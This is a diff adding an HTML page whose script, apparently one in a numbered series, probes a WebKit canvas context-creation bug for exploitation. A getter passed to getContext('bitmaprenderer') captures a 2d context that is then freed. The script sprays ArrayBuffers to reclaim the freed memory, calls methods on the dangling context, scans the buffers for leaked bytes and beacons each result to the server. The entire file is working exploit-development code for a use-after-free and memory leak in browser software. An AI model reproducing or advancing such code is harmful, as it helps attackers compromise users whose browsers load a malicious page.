@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V689 call canaries</title></head>
+<body><pre id="out">V689 — on an AB-owned slot, which JS->C++ calls survive?</pre>
+<script>
+/* V689  ---  which call survives on an AB-owned zeroed context?
+ *
+ * V688 said: idle=ok, gc=ok, beginPath/attrs/save=CRASH.
+ * But WebKit 2018-2020 source shows save() is a pure ++m_unrealizedSaveCount
+ * (no deref) while beginPath() is only m_path.clear().  So either the build
+ * is older, or the JS->C++ call path itself needs the zeroed vtable.
+ *
+ * This probe brackets each single call with beacons and adds canaries that
+ * MUST survive if the call machinery works at all:
+ *   js       Object.prototype.toString.call(ctx)   (pure JSC)
+ *   lw0      ctx.lineWidth = 0    -> setLineWidth early-returns (no state)
+ *   restore  ctx.restore()        -> m_stateStack.size()==0 -> early return
+ *   save     ctx.save()           -> V688 crash, re-test
+ *   bg       ctx.beginPath()      -> V688 crash, re-test
+ *   attr     ctx.getContextAttributes()
+ *   canvas   ctx.canvas           -> derefs m_canvas
+ *   scan     no call; churn ~450k objects to force GC, then scan every
+ *            sprayed ArrayBuffer for any byte WebKit may have written
+ *
+ * Reading:
+ *   js/lw0/restore crash  -> the call machinery itself is the wall
+ *   lw0/restore ok, save crash -> build's save() derefs state (older build)
+ *   scan nonzero>0 -> something wrote into our slot: that is a leak
+ */
+'use strict';
+var PARAM = {};
+try {
+  var parts = location.search.replace(/^\?/, '').split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var MODE = PARAM.op || 'js';
+var NAB  = parseInt(PARAM.n || '16', 10);
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function st() {
+  try { if (window.localStorage) return window.localStorage; } catch (e) {}
+  try { if (window.sessionStorage) return window.sessionStorage; } catch (e) {}
+  return null;
+}
+var ST = st();
+function stGet(k) { try { return ST ? ST.getItem(k) : null; } catch (e) { return null; } }
+function stSet(k, v) { try { if (ST) ST.setItem(k, v); } catch (e) {} }
+
+function bk(tag, body) {
+  try { new Image().src = '/beacon/V689-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now(); } catch (e) {}
+}
+function bks(tag, body) {
+  var u = '/beacon/V689-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 700)) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); } catch (e) {}
+}
+
+function clearOnce() {
+  var n = 0, pref = ['v683c_', 'v684c_', 'v685c_', 'v686c_', 'v687c_', 'v688c_', 'v689c_'];
+  try {
+    var keys = [];
+    for (var k = 0; k < ST.length; k++) keys.push(ST.key(k));
+    for (var j = 0; j < keys.length; j++) {
+      for (var p = 0; p < pref.length; p++) {
+        if (keys[j] && keys[j].indexOf(pref[p]) === 0) { ST.removeItem(keys[j]); n++; break; }
+      }
+    }
+  } catch (e) {}
+  return n;
+}
+
+function d2hex(v) {
+  var b = new ArrayBuffer(8), f = new Float64Array(b), u = new Uint32Array(b);
+  f[0] = v;
+  return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8);
+}
+function hex64(dv, o) {
+  var lo = dv.getUint32(o, true) >>> 0, hi = dv.getUint32(o + 4, true) >>> 0;
+  var l = lo.toString(16), h = hi.toString(16);
+  while (l.length < 8) l = '0' + l;
+  while (h.length < 8) h = '0' + h;
+  return h + l;
+}
+function scanAll(vs, dvs) {
+  var out = [], total = 0;
+  for (var k = 0; k < vs.length; k++) {
+    var u = vs[k], dv = dvs[k], n = 0, list = [];
+    for (var o = 0; o + 8 <= u.length; o += 8) {
+      var lo = dv.getUint32(o, true) >>> 0, hi = dv.getUint32(o + 4, true) >>> 0;
+      if (!lo && !hi) continue;
+      n++;
+      if (list.length < 4) list.push(o + ':' + hex64(dv, o));
+    }
+    if (n) { total += n; if (out.length < 4) out.push('ab' + k + '=' + n + '[' + list.join(',') + ']'); }
+  }
+  return { total: total, txt: out.join(' ') || 'none' };
+}
+
+if (MODE === 'reset' || PARAM.reset === '1') {
+  var cn = clearOnce();
+  bks('ORESET', 'cleared=1,once=' + cn);
+  say('all guards cleared. Reload the index.');
+}
+
+if (MODE !== 'reset') {
+  var onceKey = 'v689c_' + MODE;
+  var once = PARAM.once === '1';
+  var blocked = false;
+  if (once) {
+    if (stGet(onceKey) === '1') blocked = true;
+    else stSet(onceKey, '1');
+  }
+
+  if (blocked) {
+    bks('OBLOCK', 'op=' + MODE);
+    say('BLOCKED by once=1 for op=' + MODE + ' (tap RESET)');
+  } else {
+    setTimeout(function () { bk('OLATE', 'op=' + MODE + ',alive=1'); }, 2000);
+
+    bks('OBOOT', 'op=' + MODE + ',n=' + NAB + ',once=' + (once ? 1 : 0));
+
+    var canvas = document.createElement('canvas');
+    canvas.width = 1; canvas.height = 1;
+    document.body.appendChild(canvas);
+    window._v689canvas = canvas;
+
+    var savedCtx = null;
+    var dict = {};
+    Object.defineProperty(dict, 'alpha', {
+      get: function () {
+        var ctx = canvas.getContext('2d');
+        if (!ctx) return true;
+        savedCtx = ctx;
+        window._v689ctx = ctx;
+        try { ctx.lineWidth = 3.14159; } catch (eI) {}
+        return true;
+      }
+    });
+
+    var bmpCtx = null;
+    try { bmpCtx = canvas.getContext('bitmaprenderer', dict); } catch (eJ) {}
+
+    bks('OTRIG', 'op=' + MODE + ',bmp=' + (bmpCtx ? 1 : 0) + ',inner=' + (savedCtx ? 1 : 0));
+
+    if (!savedCtx || !bmpCtx) {
+      bks('OFAIL', 'op=' + MODE + ',trigger');
+      say('ABORT: trigger failed');
+    } else {
+      var abs = [], vs = [], dvs = [];
+      for (var i = 0; i < NAB; i++) {
+        var ab = new ArrayBuffer(768);
+        abs.push(ab);
+        vs.push(new Uint8Array(ab));
+        dvs.push(new DataView(ab));
+      }
+      window._v689keep = { abs: abs, vs: vs };
+      bks('OSPRAY', 'op=' + MODE + ',made=' + abs.length);
+
+      var res = '';
+      if (MODE === 'js') {
+        try { res = 'tag=' + Object.prototype.toString.call(savedCtx); }
+        catch (e1) { res = 'E!' + (e1.name || 'err'); }
+
+      } else if (MODE === 'lw0') {
+        try { savedCtx.lineWidth = 0; res = 'set0=ok'; }
+        catch (e2) { res = 'E!' + (e2.name || 'err'); }
+
+      } else if (MODE === 'restore') {
+        try { savedCtx.restore(); res = 'restore=ok'; }
+        catch (e3) { res = 'E!' + (e3.name || 'err'); }
+
+      } else if (MODE === 'save') {
+        try { savedCtx.save(); res = 'save=ok'; }
+        catch (e4) { res = 'E!' + (e4.name || 'err'); }
+
+      } else if (MODE === 'bg') {
+        try { savedCtx.beginPath(); res = 'beginPath=ok'; }
+        catch (e5) { res = 'E!' + (e5.name || 'err'); }
+
+      } else if (MODE === 'attr') {
+        try {
+          var at = savedCtx.getContextAttributes();
+          res = 'alpha=' + at.alpha + ',cs=' + at.colorSpace + ',desync=' + at.desynchronized;
+        } catch (e6) { res = 'E!' + (e6.name || 'err'); }
+
+      } else if (MODE === 'canvas') {
+        try { res = 'canvas=' + (savedCtx.canvas ? String(savedCtx.canvas.tagName) : 'null'); }
+        catch (e7) { res = 'E!' + (e7.name || 'err'); }
+
+      } else if (MODE === 'lwread') {
+        try { res = 'lw=' + d2hex(savedCtx.lineWidth); }
+        catch (e8) { res = 'E!' + (e8.name || 'err'); }
+
+      } else if (MODE === 'scan') {
+        for (var r = 0; r < 300; r++) {
+          var t = [];
+          for (var q = 0; q < 1500; q++) t.push({ a: q, s: 'z' + q });
+          for (q = 0; q < 60; q++) t.push(new ArrayBuffer(4096));
+        }
+        var sc = scanAll(vs, dvs);
+        res = 'churn-nonzero=' + sc.total + ',' + sc.txt;
+
+      } else {
+        res = 'unknown-op';
+      }
+      bks('OSTEP', 'op=' + MODE + ',' + res);
+      say(MODE + ' -> ' + res);
+    }
+  }
+}
+</script>
+</body></html>
